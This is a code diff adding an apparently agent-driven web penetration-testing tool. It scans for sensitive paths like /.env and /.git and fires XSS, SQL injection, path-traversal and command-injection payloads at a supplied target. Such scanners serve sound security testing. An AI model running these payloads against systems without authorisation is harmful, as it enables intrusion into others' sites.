@@ -1,0 +1,297 @@
+import asyncio
+import json
+import aiohttp
+from dataclasses import dataclass
+from python.helpers.tool import Tool, Response
+from python.helpers.print_style import PrintStyle
+
+@dataclass
+class State:
+    current_target: str = None
+    scan_results: dict = None
+    vuln_results: dict = None
+
+class WebTestTool(Tool):
+    async def execute(self, **kwargs):
+        await self.agent.handle_intervention()
+        await self.prepare_state()
+
+        action = self.args.get("action", "").lower().strip()
+        target = self.args.get("target", "").strip()
+
+        if not target:
+            return Response(
+                message=self.agent.read_prompt("pentest/web_test_tool_usage.md"),
+                break_loop=False
+            )
+
+        if action == "scan":
+            response = await self.scan_target(target)
+        elif action == "test_endpoint":
+            response = await self.test_endpoint(target)
+        elif action == "fuzz":
+            response = await self.fuzz_parameter(target)
+        else:
+            response = self.agent.read_prompt("pentest/web_test_tool_usage.md")
+
+        return Response(message=response, break_loop=False)
+
+    async def prepare_state(self):
+        if not hasattr(self.agent.state, "web_test"):
+            self.agent.state.web_test = State()
+
+    async def scan_target(self, target):
+        scan_type = self.args.get("scan_type", "basic")
+        options = self.args.get("options", {})
+        
+        results = {
+            "target": target,
+            "scan_type": scan_type,
+            "findings": []
+        }
+
+        # Enhanced endpoint discovery
+        common_endpoints = [
+            "/", "/login", "/admin", "/api", "/register", 
+            "/wp-admin", "/phpmyadmin", "/dashboard",
+            "/.git", "/.env", "/backup", "/wp-config.php",
+            "/robots.txt", "/sitemap.xml", "/.htaccess",
+            "/config", "/debug", "/test", "/dev"
+        ]
+        
+        # Add custom user agent and headers
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'close'
+        }
+
+        async with aiohttp.ClientSession(headers=headers) as session:
+            for endpoint in common_endpoints:
+                url = f"{target.rstrip('/')}{endpoint}"
+                try:
+                    async with session.get(url, ssl=False if options.get('ignore_ssl') else True) as response:
+                        content = await response.text()
+                        results["findings"].append({
+                            "endpoint": endpoint,
+                            "status": response.status,
+                            "headers": dict(response.headers),
+                            "content_length": len(content),
+                            "interesting_headers": {
+                                k: v for k, v in response.headers.items() 
+                                if k.lower() in ['server', 'x-powered-by', 'x-aspnet-version', 'x-frame-options']
+                            }
+                        })
+                        
+                        # Add delay if specified
+                        if options.get("delay"):
+                            await asyncio.sleep(options["delay"])
+                            
+                except Exception as e:
+                    results["findings"].append({
+                        "endpoint": endpoint,
+                        "error": str(e)
+                    })
+
+        self.agent.state.web_test.scan_results = results
+        return json.dumps(results, indent=2)
+
+    async def test_endpoint(self, target):
+        method = self.args.get("method", "GET")
+        tests = self.args.get("tests", ["xss", "sqli"])
+        data = self.args.get("data", {})
+        options = self.args.get("options", {})
+
+        results = {
+            "target": target,
+            "method": method,
+            "tests": tests,
+            "findings": []
+        }
+
+        # Enhanced payloads
+        payloads = {
+            "xss": [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "javascript:alert(1)",
+                "\"><script>alert(1)</script>",
+                "';alert(1);//",
+                "<svg/onload=alert(1)>",
+                "<iframe src=javascript:alert(1)>",
+            ],
+            "sqli": [
+                "' OR '1'='1",
+                "admin' --",
+                "1' ORDER BY 1--",
+                "1' UNION SELECT NULL--",
+                "1' AND sleep(5)--",
+                "1' WAITFOR DELAY '0:0:5'--",
+            ],
+            "lfi": [
+                "../../../etc/passwd",
+                "../../windows/win.ini",
+                "/etc/passwd",
+                "C:\\Windows\\win.ini",
+                "php://filter/convert.base64-encode/resource=index.php",
+            ],
+            "rce": [
+                ";id",
+                "| id",
+                "$(id)",
+                "`id`",
+                "& ping -c 1 127.0.0.1 &",
+                "; ping -c 1 127.0.0.1 ;",
+            ]
+        }
+
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'close'
+        }
+
+        async with aiohttp.ClientSession(headers=headers) as session:
+            for test_type in tests:
+                if test_type in payloads:
+                    for payload in payloads[test_type]:
+                        test_data = data.copy()
+                        for key in test_data:
+                            test_data[key] = payload
+
+                        try:
+                            start_time = asyncio.get_event_loop().time()
+                            if method.upper() == "GET":
+                                async with session.get(
+                                    target, 
+                                    params=test_data,
+                                    ssl=False if options.get('ignore_ssl') else True
+                                ) as response:
+                                    content = await response.text()
+                                    end_time = asyncio.get_event_loop().time()
+                                    results["findings"].append({
+                                        "test": test_type,
+                                        "payload": payload,
+                                        "status": response.status,
+                                        "content_length": len(content),
+                                        "reflected": payload in content,
+                                        "response_time": end_time - start_time
+                                    })
+                            else:
+                                async with session.post(
+                                    target, 
+                                    data=test_data,
+                                    ssl=False if options.get('ignore_ssl') else True
+                                ) as response:
+                                    content = await response.text()
+                                    end_time = asyncio.get_event_loop().time()
+                                    results["findings"].append({
+                                        "test": test_type,
+                                        "payload": payload,
+                                        "status": response.status,
+                                        "content_length": len(content),
+                                        "reflected": payload in content,
+                                        "response_time": end_time - start_time
+                                    })
+
+                            if options.get("delay"):
+                                await asyncio.sleep(options["delay"])
+
+                        except Exception as e:
+                            results["findings"].append({
+                                "test": test_type,
+                                "payload": payload,
+                                "error": str(e)
+                            })
+
+        return json.dumps(results, indent=2)
+
+    async def fuzz_parameter(self, target):
+        parameter = self.args.get("parameter")
+        fuzz_type = self.args.get("fuzz_type", "xss")
+        options = self.args.get("options", {})
+
+        if not parameter:
+            return "Error: No parameter specified for fuzzing"
+
+        results = {
+            "target": target,
+            "parameter": parameter,
+            "fuzz_type": fuzz_type,
+            "findings": []
+        }
+
+        # Enhanced fuzzing payloads
+        payloads = {
+            "xss": [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "javascript:alert(1)",
+                "\"><script>alert(1)</script>",
+                "';alert(1);//",
+                "<svg/onload=alert(1)>",
+                "<iframe src=javascript:alert(1)>"
+            ],
+            "sqli": [
+                "' OR '1'='1",
+                "admin' --",
+                "1' ORDER BY 1--",
+                "1' UNION SELECT NULL--",
+                "1' AND sleep(5)--"
+            ],
+            "lfi": [
+                "../../../etc/passwd",
+                "../../windows/win.ini",
+                "php://filter/convert.base64-encode/resource=index.php"
+            ],
+            "rce": [
+                ";id",
+                "| id",
+                "$(id)",
+                "`id`",
+                "& ping -c 1 127.0.0.1 &"
+            ]
+        }
+
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'close'
+        }
+
+        if fuzz_type in payloads:
+            async with aiohttp.ClientSession(headers=headers) as session:
+                for payload in payloads[fuzz_type]:
+                    try:
+                        params = {parameter: payload}
+                        start_time = asyncio.get_event_loop().time()
+                        async with session.get(
+                            target, 
+                            params=params,
+                            ssl=False if options.get('ignore_ssl') else True
+                        ) as response:
+                            content = await response.text()
+                            end_time = asyncio.get_event_loop().time()
+                            results["findings"].append({
+                                "payload": payload,
+                                "status": response.status,
+                                "content_length": len(content),
+                                "reflected": payload in content,
+                                "response_time": end_time - start_time
+                            })
+                            
+                            if options.get("delay"):
+                                await asyncio.sleep(options["delay"])
+                    except Exception as e:
+                        results["findings"].append({
+                            "payload": payload,
+                            "error": str(e)
+                        })
+
+        return json.dumps(results, indent=2)
